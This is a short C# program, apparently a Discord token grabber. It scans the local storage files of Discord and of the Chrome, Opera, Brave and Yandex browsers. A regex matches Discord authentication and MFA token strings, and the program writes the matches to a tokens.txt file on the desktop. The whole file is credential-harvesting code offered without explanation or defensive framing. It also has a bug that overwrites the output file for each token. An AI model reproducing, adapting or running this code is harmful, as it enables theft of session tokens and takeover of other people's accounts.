using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Text.RegularExpressions;

namespace pull
{
    class Program
    {
        static void Main(string[] args)
        {


            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string locationdrop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            Dictionary<string, string> paths = new Dictionary<string, string>
            {
                { "Discord", Path.Combine(roaming, "Discord") },
                { "Discord Canary", Path.Combine(roaming, "discordcanary") },
                { "Discord PTB", Path.Combine(roaming, "discordptb") },
                { "Google Chrome", Path.Combine(local, "Google\\Chrome\\User Data\\Default") },
                { "Opera", Path.Combine(roaming, "Opera Software\\Opera Stable") },
                { "Brave", Path.Combine(local, "BraveSoftware\\Brave-Browser\\User Data\\Default") },
                { "Yandex", Path.Combine(local, "Yandex\\YandexBrowser\\User Data\\Default") }
            };

            foreach (var kvp in paths)
            {
                if (!Directory.Exists(kvp.Value))
                    continue;

                Console.WriteLine($"**{kvp.Key}**");
                List<string> tokens = FindTokens(kvp.Value);

                if (tokens.Count > 0)
                {
                    foreach (var token in tokens)
                    {
                       

                        using (StreamWriter outputFile = new StreamWriter(Path.Combine(locationdrop, "tokens.txt")))
                        {
                           
                               outputFile.WriteLine(token);
                        }

                    }
                }
                else
                {
                   
                }
                Console.WriteLine();
            }
        }

        static List<string> FindTokens(string path)
        {
            path = Path.Combine(path, "Local Storage\\leveldb");
            List<string> tokens = new List<string>();

            foreach (var file in Directory.EnumerateFiles(path, "*.*", SearchOption.AllDirectories))
            {
                if (file.EndsWith(".log") || file.EndsWith(".ldb"))
                {
                    foreach (var line in File.ReadLines(file))
                    {
                        foreach (Match match in Regex.Matches(line, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
                        {
                            tokens.Add(match.Value);
                        }
                    }
                }
            }

            return tokens;
        }
    }
}
